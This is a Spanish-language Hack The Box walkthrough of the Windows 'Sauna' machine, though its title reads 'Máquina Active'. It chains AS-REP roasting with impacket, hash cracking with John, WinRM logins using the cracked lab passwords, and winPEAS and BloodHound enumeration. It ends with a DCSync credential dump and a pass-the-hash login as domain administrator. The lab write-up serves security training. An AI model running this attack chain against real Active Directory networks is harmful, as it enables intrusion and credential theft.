# Máquina Active

Enlace a la máquina -> [HackTheBox](https://app.hackthebox.com/machines/Sauna)

![imagen](https://github.com/user-attachments/assets/3acd8b85-face-47a8-bb7c-5a67c8edabc6)

- **Nombre de la Máquina:** Sauna  
- **Sistema Operativo:** Windows  
- **Dificultad:** Fácil  
- **Plataforma:** Hack The Box  
- **Dirección IP:** 10.10.10.175 
- **Skills**
  - Information Leakage
  - Ldap Enumeration
  - Kerberos User Enumeration - Kerbrute
  - ASRepRoast Attack (GetNPUsers)
  - Cracking Hashes
  - System Enumeration - WinPEAS
  - AutoLogon Credentials
  - BloodHound - SharpHound.ps1
  - DCSync Attack - Secretsdump [Privilege Escalation]
  - PassTheHash

## Reconocimiento y Enumeración

Comenzamos realizando un escaneo general utilizando Nmap para identificar los puertos abiertos y sus versiones en la IP del objetivo:

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn -sCV 10.10.10.175 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/3ab6d7ec-e366-4eee-851d-975c839dfe94)

Por el escaneo vemos que es un común Windows server, aunque lo que destaca es tener el puerto 80 abierto.

## Enumeración Web

La página parece ser la de una especie de banco, aunque no pudimos identificar ninguna vulnerabilidad en ella, lo más relevante lo encontramos en http://10.10.10.175/about.html.

![imagen](https://github.com/user-attachments/assets/e6a319aa-c5b7-406a-bfe5-8b18f4087edd)

La página tiene una sección de los integrantes de la empresa, una práctica común para crear los usuarios es tomar la primera letra del nombre, el apellido y juntarlos, a veces se pone un punto en medio, así que asumiendo esta posibilidad creamos una lista de posibles usuarios usando username-anarchy.

```bash
./username-anarchy --input-file names.txt  --select-format first,flast,first.last,firstl > final.txt
```

![imagen](https://github.com/user-attachments/assets/98130997-d549-4e40-be44-5ebccc173c90)

## ASREProast Attack

Ya tenemos una lista de usuarios y el nombre de dominio, pero no contamos con ninguna contraseña. Podemos intentar realizar un ataque **ASREPRoast**.

### ¿Qué es ASREPRoast?
**ASREPRoast** es un ataque que explota una configuración específica en entornos de Active Directory (AD) que utilizan el protocolo Kerberos para la autenticación. Se trata de una técnica de **dumping de credenciales** que permite a los atacantes obtener hashes de contraseñas de cuentas de usuario que tienen deshabilitada la propiedad **"No requerir preautenticación Kerberos"**. Cuando esta propiedad está deshabilitada, los atacantes pueden solicitar datos de autenticación sin necesidad de conocer la contraseña del usuario.

### Cómo Funciona el Ataque

- **Reconocimiento**: El atacante realiza un reconocimiento para identificar cuentas con la propiedad **"No requerir preautenticación Kerberos"** deshabilitada.
- **Solicitud de TGT**: El atacante envía una solicitud de autenticación (AS-REQ) al controlador de dominio (DC) para una cuenta vulnerable.
- **Respuesta del DC**: El DC responde con un mensaje de respuesta de autenticación (AS-REP) que contiene datos cifrados con una clave derivada de la contraseña del usuario.
- **Extracción de Hashes**: El atacante extrae el hash de la contraseña del mensaje AS-REP.

```bash
impacket-GetNPUsers -no-pass -usersfile username-anarchy/final.txt EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175
```

![imagen](https://github.com/user-attachments/assets/47397092-90d1-41f3-9165-5fe08dc45ffe)

En este punto, ya contamos con el nombre de usuario y el TGT (Ticket Granting Ticket). A continuación, copiaremos todo el TGT en un nuevo archivo y utilizaremos **John the Ripper** para proceder con el cracking.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![imagen](https://github.com/user-attachments/assets/e428cc40-28a9-45bb-a10b-e7aaa49a7d52)

Recordemos que en nuestro escaneo hemos identificado el puerto **5985** activo, que corresponde a **WinRM**. Probaremos si tenemos control de acceso remoto vía winrm con el usuario co el cuál obtuvimos los credenciales.

```bash
nxc winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
```

![imagen](https://github.com/user-attachments/assets/9605906d-301f-40dc-ad9e-917b53081cf3)

Tenemos el mensaje de pwn3d! por lo cual tenemos ejecución remota de comando con WinRm.

![imagen](https://github.com/user-attachments/assets/231534d8-5469-477a-bac6-73dcc48ab824)

Enumerando un un poco me dí cuenta de que existe otro usuario más llamado **svc_loanmgr**.

![imagen](https://github.com/user-attachments/assets/2e0d54b4-900c-40c4-869b-573757176248)

Al no encontrar nada más, me descargué y ejecuté un programa llamado **winPeas.exe**, con el objetivo de enumerar aún más el sistema y ver vectores de ataque.

```bash
upload /home/kali/Desktop/HackTheBox/winPEASx64.exe
.\winPEASx64.exe
```

![imagen](https://github.com/user-attachments/assets/723b6628-a296-431a-8838-2ce9538654e2)

Pues después de ejecutarlo podemos ver un usuario y una contraseña, tiene configurado el autologin.

![imagen](https://github.com/user-attachments/assets/35d633cd-a516-4659-9ab0-03674139c836)

Lo comprobaremos nuevamente en **netexec** si tenemos control remoto con winrm.

```bash
nxc winrm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
```

![imagen](https://github.com/user-attachments/assets/436bd883-fa71-439d-8427-78b12526cc3b)

Enumerando el usuario no encuentro nada relevante.

![imagen](https://github.com/user-attachments/assets/6950b163-25c8-4e13-ad98-b51850c88ef7)

## Escalada de privilegios

Usaremos bloodhound para enumerar más aún el usuario y el dominio a ver si encontramos algún vector de ataque para escalar privilegios.

Subimos el archivo SharPound.exe y lo ejecutaremos, nos creará un .zip y seguidamente lo descargaremos para cargarlo en bloodhound.

```bash
upload /home/kali/Desktop/HackTheBox/SharpHound.exe
.\SharpHound.exe -c all
download 20241215143827_BloodHound.zip
```

![imagen](https://github.com/user-attachments/assets/d640c85e-2cd5-42e2-9088-607b74ade86b)

![imagen](https://github.com/user-attachments/assets/f8194786-d71e-4382-ba44-9fe4f0c99aa6)

![imagen](https://github.com/user-attachments/assets/3c4a780a-5991-44ee-aa80-73d87739f329)

Ya una vez dentro, escribiremos el nombre del usuario comprometido y buscaremos la manera mas rápida de escalar privilegios.

![imagen](https://github.com/user-attachments/assets/6106879a-7a4a-48f4-ae16-9cb7747cea1d)

![imagen](https://github.com/user-attachments/assets/b8d71123-f694-44e8-8047-1f312b76ef27)

### DCSync Attack

Para esto, utilizaremos **impacket-secretsdump** para solicitar y recibir información de replicación del controlador de dominio (DC), como si fuéramos otro controlador de dominio legítimo. El DC responderá con los datos solicitados, que incluirán hashes de contraseñas NTLM y Kerberos de los usuarios, incluidas las cuentas privilegiadas.

![imagen](https://github.com/user-attachments/assets/4362c552-54fa-45e7-a01c-cda7e85a5e06)

![imagen](https://github.com/user-attachments/assets/6c13e736-b393-4dca-a596-039967d174c7)

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
```

![imagen](https://github.com/user-attachments/assets/099d2fb9-553c-491f-bec1-321baca52730)

El **Pass-the-Hash** permite a los atacantes utilizar el hash NTLM de una contraseña para autenticarse en servicios remotos como si fuera la contraseña original. Esto es posible porque muchos sistemas de autenticación aceptan hashes directamente, debido a la implementación de protocolos como NTLM. Esta vulnerabilidad presenta un riesgo significativo, ya que los atacantes pueden acceder a sistemas y recursos sin necesidad de conocer la contraseña real del usuario.

```bash
evil-winrm -i 10.10.10.175 -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
```

![imagen](https://github.com/user-attachments/assets/bf7ac425-07aa-4df3-a459-80334d942758)

Y tenemos acceso como Administrador del Dominio.
